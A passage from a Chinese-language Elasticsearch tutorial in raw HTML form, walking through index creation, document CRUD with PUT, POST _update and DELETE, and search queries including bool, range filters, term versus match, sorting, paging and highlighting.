operator">:</span><span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"text"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"age"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"long"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"birthday"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"date"</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>输出如下，说明创建成功了</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"acknowledged"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"shards_acknowledged"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"index"</span> <span class="token operator">:</span> <span class="token string">"test2"</span><span class="token punctuation">}</span></code></pre><p><em><strong>GET 查看规则信息</strong></em><br>现在我们来尝试使用一下 GET 命令，请求具体的信息！<br><img src="/img/24-6-2/5.png">可以发现通过GET请求，我们能够详细获取到该索引下具体的信息，其中包含字段类型。那上面示例中字段类型是我自己定义的，那么我们不定义类型会是什么情况呢？<br>我们首先发起一个PUT请求，创建一个新的索引 test3，并添加一条数据</p><pre class="language-json" data-language="json"><code class="language-json">PUT /test3/_doc/<span class="token number">1</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"大数据梦想家"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">,</span>  <span class="token property">"birthday"</span><span class="token operator">:</span><span class="token string">"2000-02-06"</span><span class="token punctuation">}</span></code></pre><p>然后通过GET请求，可以发现非常的智能。但是如果我们的文档字段类型没有指定，那么es就会给我们默认配置的字段类型！<img src="/img/24-6-2/6.png"><br><em><strong>UPDATE修改</strong></em><br>那如果我们想要修改文档里的字段信息呢？我们可以选择 UPDATE 也可以 选择 PUT进行覆盖<br>例如我可以像下图中的例子，将之前test3索引中的1号文档中的 name 字段修改后，重复提交，发现更新成功，但是注意 version 版本号已经变成了2<img src="/img/24-6-2/7.png">但是注意这种方法有弊端，如果我们在PUT的过程中，遗漏了字段，那么数据就会被新数据覆盖！所以，<font color="red">修改数据不建议使用PUT覆盖的方式！</font><br>我们使用 POST 命令，在 id 后面跟 _update ，要修改的内容放到 doc 文档(属性)中即可。<img src="/img/24-6-2/8.png">可以发现此时更新之后的version变成了3。所以，一旦索引被创建了之后，所有的修改都可以通过版本号看到变化。<br><em><strong>DELETE删除</strong></em><br><img src="/img/24-6-2/9.png">结论： 通过 DELETE 命令实现删除，根据请求判断是删除索引还是删除文档记录！因此，<font color="blue">使用 RESTFUL 风格是我们学习ES值得推荐使用的</font></p><h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><p>我们可以通过GET _cat/health来获取集群的一个健康状态除了看集群的健康信息，<br>通过命令GET _cat/indices?v，我们可以获取到当前索引的很多信息，返回值包括所有索引的状态健康情况，分片，数据储存大小等等<img src="/img/24-6-2/10.png"></p><h3 id="关于文档的基本操作"><a href="#关于文档的基本操作" class="headerlink" title="关于文档的基本操作"></a>关于文档的基本操作</h3><p>接下来我们学习关于文档的基本操作，首先先重新创建一个新的索引，并添加一些数据</p><pre class="language-json" data-language="json"><code class="language-json">PUT /alice/user/<span class="token number">1</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"在最美的年华，做最好的自己！"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"技术宅"</span><span class="token punctuation">,</span><span class="token string">"温暖"</span><span class="token punctuation">,</span><span class="token string">"思维活跃"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>PUT /alice/user/<span class="token number">2</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"张三"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">23</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"法外狂徒"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"渣男"</span><span class="token punctuation">,</span><span class="token string">"交友"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>PUT /alice/user/<span class="token number">3</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"路人甲"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"不可描述"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"靓仔"</span><span class="token punctuation">,</span><span class="token string">"网游"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>接下来就可以进行文档的基本操作了！</p><h4 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h4><p>通过 GET 命令，我们可以搜索到指定 id 的文档信息<br>GET alice/user/1<br><img src="/img/24-6-2/11.png">当然这是简单的搜索，下面我们来看一下 es 如何做条件查询<br>条件查询_search?q=<br>我们可以通过如下命令，来进行条件查询<br>GET alice/user/_search?q=name:张三<br><img src="/img/24-6-2/12.png"><br>我们看一下结果 返回并不是 数据本身，是给我们了一个 hits ，还有 _score得分，就是根据算法算出和查询条件匹配度高的分就越高。<br>我们在以某度为例的搜索引擎上进行搜索也是一样的道理，权重越高网站的位置就越靠前！<br>但我们一般使用<strong>不会直接加条件去查询</strong>，更多的会用到下面要介绍到的<strong>复杂操作搜索</strong>。<br><em><strong>复杂操作搜索 select（ 排序，分页，高亮，模糊查询，精准查询！）</strong></em><br>为了方便测试，我又执行下面的命令，往Alice索引下添加了2个文档</p><pre class="language-json" data-language="json"><code class="language-json">PUT /alice/user/<span class="token number">4</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝学Java"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"技术成就自我！"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"思维敏捷"</span><span class="token punctuation">,</span><span class="token string">"喜欢学习"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>PUT /alice/user/<span class="token number">5</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝学Python"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">26</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"人生苦短，我用Python！"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"好学"</span><span class="token punctuation">,</span><span class="token string">"勤奋刻苦"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>现在我们来构建一个查询：</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/img/24-6-2/13.png">默认的话，es会查询出文档的所有字段，如果我们<strong>只想要部分的字段</strong>，就可以像下面所展示的demo进行查询：</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"_source"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"desc"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>如上例所示，在查询中，通过 _source 来控制仅返回 name 和 desc 属性。页面返回的查询结果如下：<img src="/img/24-6-2/14.png"><font color="red">一般的，我们推荐使用构建查询，以后在与程序交互时的查询等也是使用构建查询方式处理查询条件，因为该方式可以构建更加复杂的查询条件，也更加一目了然。</font></p><h4 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h4><p>我们说到排序，有人就会想到：正序或倒序。那么我们先来根据age字段倒序查询：</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"sort"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>       <span class="token property">"age"</span><span class="token operator">:</span>       <span class="token punctuation">{</span>         <span class="token property">"order"</span><span class="token operator">:</span> <span class="token string">"desc"</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>查询返回的结果如下：<img src="/img/24-6-2/15.png">同理，如果我们想要正序查询，只需要将desc换成了asc即可。</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"sort"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>       <span class="token property">"age"</span><span class="token operator">:</span>       <span class="token punctuation">{</span>         <span class="token property">"order"</span><span class="token operator">:</span> <span class="token string">"asc"</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"from"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>  <span class="token property">"size"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span></code></pre><p>查询结果如下：<img src="/img/24-6-2/16.png"><br><strong>注意:在排序的过程中，只能使用可排序的属性进行排序。那么可以排序的属性有哪些呢?</strong></p><ul><li>数字</li><li>日期</li><li>ID</li></ul><p><font color="red">其他都不行！</font></p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>学到这里，我们也可以看到，我们的查询条件越来越多，开始仅是<strong>简单查询</strong>，慢慢增加<strong>条件查询</strong>，增加排序，对返回结果进行限制。所以，我们可以说，对 于 elasticsearch 来说，所有的查询条件都是<strong>可插拔</strong>的。比如说，我们在查询中，仅对返回结果进行限制:</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>   <span class="token property">"query"</span><span class="token operator">:</span>  <span class="token punctuation">{</span><span class="token property">"match_all"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"from"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>  # 从第n条开始  <span class="token property">"size"</span><span class="token operator">:</span><span class="token number">4</span>   # 返回n条数据<span class="token punctuation">}</span></code></pre><p>分页查询类似于我们SQL中的 limit 语句。在 es 中我们想要实现这样的效果只需要用 from 指定 从第几条数据开始，size指定返回多少条数据即可。<img src="/img/24-6-2/17.png"></p><h4 id="布尔查询"><a href="#布尔查询" class="headerlink" title="布尔查询"></a>布尔查询</h4><p><strong>must (and)</strong><br>我们上面已经讲过了通过<strong>构建查询</strong>的方法去做<strong>模糊查询</strong>，那我们如果想多条件查询，例如查询name为alice，并且age是25岁，那该如何查询呢？<br>我们通过在 bool属性内使用 must 来作为查询条件！看结果，是不是 有点像and的感觉，里面的条件需要都满足！</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"must"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">25</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果如下<img src="/img/24-6-2/18.png"><strong>should (or)</strong><br>那么我要查询name为爱丽丝或 age 为 25 的呢？<br>我们只需要将boolean属性内的must值换成should 即可，这就有点相当于 or 的感觉</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"should"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">25</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果如下<br><img src="/img/24-6-2/19.png"><strong>must_not (not)</strong><br>那现在我想要查询年龄不是 25 的 数据，只需要将boolean的属性值换成must_not即可</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"must_not"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">25</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果如下：<img src="/img/24-6-2/20.png"><strong>Fitter</strong><br>那如果查询 name 为爱丽丝，age 大于 24 的数据，需要使用到filter进行过滤。</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"must"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"filter"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"range"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"age"</span><span class="token operator">:</span> <span class="token punctuation">{</span>              <span class="token property">"gt"</span><span class="token operator">:</span> <span class="token number">24</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果如下，可以发现只有age为25 和 26的两条数据<img src="/img/24-6-2/21.png">这里就用到了 filter 条件过滤查询，过滤条件的范围用 range 表示，其余操作如下 :</p><ul><li>gt 表示大于</li><li>gte 表示大于等于</li><li>lt 表示小于</li><li>lte 表示小于等于</li></ul><p>那现在要查询，例如 age 在24到26之间的数据该如何查询？</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"filter"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"range"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"age"</span><span class="token operator">:</span> <span class="token punctuation">{</span>              <span class="token property">"gte"</span><span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span>              <span class="token property">"lte"</span><span class="token operator">:</span> <span class="token number">26</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果：<img src="/img/24-6-2/22.png"></p><h4 id="短语检索"><a href="#短语检索" class="headerlink" title="短语检索"></a>短语检索</h4><p>为了方便测试，我们再加入几条文档数据：</p><pre class="language-json" data-language="json"><code class="language-json">PUT /alice/user/<span class="token number">6</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"大数据老K"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"技术成就自我！"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"男"</span><span class="token punctuation">,</span><span class="token string">"学习"</span><span class="token punctuation">,</span><span class="token string">"技术"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>PUT /alice/user/<span class="token number">7</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"Python女侠"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">26</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"人生苦短，我用Python！"</span><span class="token punctuation">,</span>  <span class="token property">"tags"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"靓女"</span><span class="token punctuation">,</span><span class="token string">"勤奋学习"</span><span class="token punctuation">,</span><span class="token string">"善于交际"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>例如现在需要查询tags中包含“男”的数据</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"tags"</span><span class="token operator">:</span><span class="token string">"男"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果如下：<br><img src="/img/24-6-2/23.png"><br><strong>匹配多个标签</strong><br>既然按照标签检索，那么，能不能写多个标签呢?</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"tags"</span><span class="token operator">:</span><span class="token string">"男 学习"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>此时我们可以观察返回的结果，可以发现<strong>只要满足一个标签</strong>就能返回这个数据了<br><img src="/img/24-6-2/24.png"></p><h4 id="精确查询"><a href="#精确查询" class="headerlink" title="精确查询"></a>精确查询</h4><p>term查询是直接通过倒排索引指定的词条进程精确查找的！<br><strong>关于分词：</strong></p><ul><li>term ，不经过分词，直接查询精确的值</li><li>match，会使用分词器解析！（先分析文档，然后再通过分析的文档进行查询！）</li></ul><p>说到分词器解析，就不得不提到两种数据类型：text和keyword。下面我们就来做个测试：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token comment">// 创建一个索引，并指定类型</span>PUT testdb<span class="token punctuation">{</span>  <span class="token property">"mappings"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"text"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"desc"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"keyword"</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 插入数据</span>PUT testdb/_doc/<span class="token number">1</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝学大数据name"</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"爱丽丝学大数据desc"</span><span class="token punctuation">}</span>PUT testdb/_doc/<span class="token number">2</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"爱丽丝学大数据name2"</span><span class="token punctuation">,</span>  <span class="token property">"desc"</span><span class="token operator">:</span><span class="token string">"爱丽丝学大数据desc2"</span><span class="token punctuation">}</span></code></pre><p>上述中testdb索引中,字段name在被查询时会被分析器进行分析后匹配查询。而属于keyword类型不会被分析器处理。<br>我们来验证一下：</p><pre class="language-json" data-language="json"><code class="language-json">GET _analyze<span class="token punctuation">{</span>  <span class="token property">"analyzer"</span><span class="token operator">:</span> <span class="token string">"keyword"</span><span class="token punctuation">,</span>  <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"爱丽丝学大数据 name"</span><span class="token punctuation">}</span></code></pre><p>查询结果：<img src="/img/24-6-2/25.png">是不是没有被分析~就是简单的一个字符串啊。再测试一下：</p><pre class="language-json" data-language="json"><code class="language-json">GET _analyze<span class="token punctuation">{</span>  <span class="token property">"analyzer"</span><span class="token operator">:</span> <span class="token string">"standard"</span><span class="token punctuation">,</span>  <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"爱丽丝学大数据 name"</span><span class="token punctuation">}</span></code></pre><p>查询结果：<img src="/img/24-6-2/26.png">然后我们可以得出结论：<strong>keyword 字段类型不会被分析器分析</strong>！<br>下面我们用前面添加的2条数据做过测试：<br>先精准查询text类型的字段</p><pre class="language-json" data-language="json"><code class="language-json">GET testdb/_search         <span class="token comment">// text 会被分析器分析 查询</span><span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"term"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果，2条数据都能匹配到<img src="/img/24-6-2/27.png">然后用standard类型做精准测试</p><pre class="language-json" data-language="json"><code class="language-json">GET testdb/_search          <span class="token comment">// keyword 不会被分析所以直接查询 </span><span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"term"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"desc"</span><span class="token operator">:</span> <span class="token string">"爱丽丝学大数据desc"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果，只有1条数据能匹配到<img src="/img/24-6-2/28.png"></p><h4 id="查找多个精确值"><a href="#查找多个精确值" class="headerlink" title="查找多个精确值"></a>查找多个精确值</h4><p>为了方便测试，我们再添加如下数据：</p><pre class="language-json" data-language="json"><code class="language-json">PUT testdb/_doc/<span class="token number">3</span><span class="token punctuation">{</span>  <span class="token property">"t1"</span><span class="token operator">:</span><span class="token string">"22"</span><span class="token punctuation">,</span>  <span class="token property">"t2"</span><span class="token operator">:</span><span class="token string">"2021-03-01"</span><span class="token punctuation">}</span>PUT testdb/_doc/<span class="token number">4</span><span class="token punctuation">{</span>  <span class="token property">"t1"</span><span class="token operator">:</span><span class="token string">"33"</span><span class="token punctuation">,</span>  <span class="token property">"t2"</span><span class="token operator">:</span><span class="token string">"2021-03-01"</span><span class="token punctuation">}</span></code></pre><p>然后进行查询</p><pre class="language-json" data-language="json"><code class="language-json">GET testdb/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"bool"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"should"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token property">"term"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"t1"</span><span class="token operator">:</span><span class="token string">"22"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>          <span class="token property">"term"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"t1"</span><span class="token operator">:</span><span class="token string">"33"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果：<img src="/img/24-6-2/29.png">可以发现2条数据也都能查到，证明就算是term精确查询，也能够查询多个值。<br>当然，除了 bool 查询之外，下面这种方式也同样是可以的。</p><pre class="language-json" data-language="json"><code class="language-json">GET testdb/_doc/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"terms"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"t1"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"22"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>下面要介绍的功能，就是经常被搜索引擎用到的“<strong>高亮显示</strong>”！</p><h4 id="高亮显示"><a href="#高亮显示" class="headerlink" title="高亮显示"></a>高亮显示</h4><p>我们可以通过highlight属性，来对我们查询的结果的指定字段做高亮显示！</p><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"highlight"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"fields"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>观察返回的结果，我们可以发现搜索相关的结果，被加上了高亮标签<em><img src="/img/24-6-2/30.png">现在效果看到了，那我们有没有办法<strong>自定义样式</strong>呢？<br>答案当然是可以的，我们需要在pre_tags中定义标签的前缀，post_tags中定义后缀！</em></p><em><pre class="language-json" data-language="json"><code class="language-json">GET alice/user/_search<span class="token punctuation">{</span>  <span class="token property">"query"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"match"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"爱丽丝"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"highlight"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"pre_tags"</span><span class="token operator">:</span> <span class="token string">"&lt;b class='key' style='color:red'&gt;"</span><span class="token 